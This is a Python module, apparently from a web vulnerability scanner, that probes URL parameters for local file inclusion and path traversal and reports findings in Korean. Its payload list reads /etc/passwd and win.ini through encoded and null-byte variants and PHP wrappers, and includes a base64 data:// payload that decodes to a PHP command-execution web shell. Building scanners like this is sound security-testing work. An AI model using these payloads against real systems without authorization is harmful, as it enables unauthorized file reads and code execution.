"""
Local File Inclusion (LFI) / Directory Traversal vulnerability checker
"""
import re
from typing import List, Dict, Any
from urllib.parse import urlparse, parse_qs
import aiohttp

from app.scanner.checks.base import BaseChecker


class LFIChecker(BaseChecker):
    """
    Check for Local File Inclusion and Directory Traversal vulnerabilities
    """
    
    vuln_type = "lfi"
    
    # LFI/Path Traversal payloads
    PAYLOADS = [
        # Unix-like systems
        '../../../etc/passwd',
        '....//....//....//etc/passwd',
        '../../../../../../../etc/passwd',
        '..%2f..%2f..%2fetc/passwd',
        '..%252f..%252f..%252fetc/passwd',
        '....//....//etc/passwd',
        '..\\..\\..\\etc\\passwd',
        '/etc/passwd',
        'file:///etc/passwd',
        
        # Windows systems
        '..\\..\\..\\windows\\win.ini',
        '....\\\\....\\\\windows\\win.ini',
        '..%5c..%5c..%5cwindows/win.ini',
        'C:\\Windows\\win.ini',
        'C:/Windows/win.ini',
        
        # Null byte injection (older PHP)
        '../../../etc/passwd%00',
        '../../../etc/passwd%00.html',
        '../../../etc/passwd%00.php',
        
        # Wrapper-based (PHP)
        'php://filter/convert.base64-encode/resource=index.php',
        'php://filter/read=string.rot13/resource=index.php',
        'php://input',
        'data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7Pz4=',
    ]
    
    # Patterns indicating successful LFI
    SUCCESS_PATTERNS = {
        'unix': [
            r'root:.*:0:0:',
            r'daemon:.*:',
            r'bin:.*:',
            r'nobody:.*:',
            r'/bin/bash',
            r'/bin/sh',
        ],
        'windows': [
            r'\[fonts\]',
            r'\[extensions\]',
            r'\[mci extensions\]',
            r'\[files\]',
            r'\[Mail\]',
        ],
        'php': [
            r'<\?php',
            r'<?=',
        ]
    }
    
    # Parameter names that commonly handle file paths
    FILE_PARAMS = [
        'file', 'page', 'path', 'template', 'document', 'doc',
        'folder', 'root', 'pg', 'style', 'pdf', 'include',
        'dir', 'show', 'nav', 'site', 'content', 'cont',
        'view', 'layout', 'mod', 'module', 'load', 'read',
        'lang', 'language', 'locale', 'cat', 'category'
    ]
    
    async def check(
        self,
        session: aiohttp.ClientSession,
        url: str
    ) -> List[Dict[str, Any]]:
        """
        Check URL for LFI/Directory Traversal vulnerabilities
        """
        vulnerabilities = []
        
        parsed = urlparse(url)
        params = parse_qs(parsed.query)
        
        # Check existing parameters
        for param_name, param_values in params.items():
            param_lower = param_name.lower()
            
            # Check if parameter looks like it handles files
            is_file_param = any(fp in param_lower for fp in self.FILE_PARAMS)
            
            # Also check if value looks like a file path
            for value in param_values:
                if '.' in value or '/' in value or '\\' in value:
                    is_file_param = True
                    break
            
            if is_file_param:
                vulns = await self._test_lfi_param(session, url, param_name)
                vulnerabilities.extend(vulns)
        
        # If no file params found, try common ones
        if not vulnerabilities and not params:
            for param_name in self.FILE_PARAMS[:5]:
                vulns = await self._test_lfi_param(session, url, param_name)
                vulnerabilities.extend(vulns)
        
        return vulnerabilities
    
    async def _test_lfi_param(
        self,
        session: aiohttp.ClientSession,
        url: str,
        param: str
    ) -> List[Dict[str, Any]]:
        """
        Test a parameter for LFI vulnerability
        """
        vulnerabilities = []
        parsed = urlparse(url)
        base_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}"
        
        # Get baseline response first
        try:
            async with session.get(
                f"{base_url}?{param}=test",
                timeout=aiohttp.ClientTimeout(total=10),
                ssl=False
            ) as baseline_resp:
                baseline_text = await baseline_resp.text()
                baseline_length = len(baseline_text)
        except:
            baseline_text = ""
            baseline_length = 0
        
        for payload in self.PAYLOADS[:10]:  # Test first 10 payloads
            test_url = f"{base_url}?{param}={payload}"
            
            try:
                async with session.get(
                    test_url,
                    timeout=aiohttp.ClientTimeout(total=10),
                    ssl=False
                ) as response:
                    text = await response.text()
                    
                    # Check for success patterns
                    for os_type, patterns in self.SUCCESS_PATTERNS.items():
                        for pattern in patterns:
                            if re.search(pattern, text, re.IGNORECASE):
                                # Verify this wasn't in baseline
                                if not re.search(pattern, baseline_text, re.IGNORECASE):
                                    severity = "critical" if os_type in ['unix', 'windows'] else "high"
                                    
                                    vulnerabilities.append(self.create_vulnerability(
                                        name="Local File Inclusion (LFI)",
                                        severity=severity,
                                        url=url,
                                        description=f"파라미터 '{param}'에서 LFI 취약점이 발견되었습니다. "
                                                   f"공격자가 서버의 로컬 파일을 읽거나, "
                                                   f"경우에 따라 원격 코드 실행이 가능할 수 있습니다.",
                                        evidence=f"Payload: {payload}\n"
                                                f"Pattern matched: {pattern}\n"
                                                f"OS type: {os_type}",
                                        parameter=param,
                                        method="GET",
                                        recommendation="1. 사용자 입력으로 파일 경로를 결정하지 마세요.\n"
                                                      "2. 파일명 화이트리스트를 사용하세요.\n"
                                                      "3. realpath()로 경로를 정규화하고 검증하세요.\n"
                                                      "4. 웹 루트 외부 접근을 차단하세요.\n"
                                                      "5. 불필요한 PHP wrapper를 비활성화하세요.",
                                        references=[
                                            "https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/11.1-Testing_for_Local_File_Inclusion",
                                            "https://cheatsheetseries.owasp.org/cheatsheets/Input_Validation_Cheat_Sheet.html"
                                        ],
                                        cwe_id="CWE-22",
                                        cvss_score=8
                                    ))
                                    return vulnerabilities
                    
                    # Check for significant response difference
                    if abs(len(text) - baseline_length) > 500:
                        # Might indicate file inclusion, but not confirmed
                        pass
                            
            except Exception:
                continue
        
        return vulnerabilities

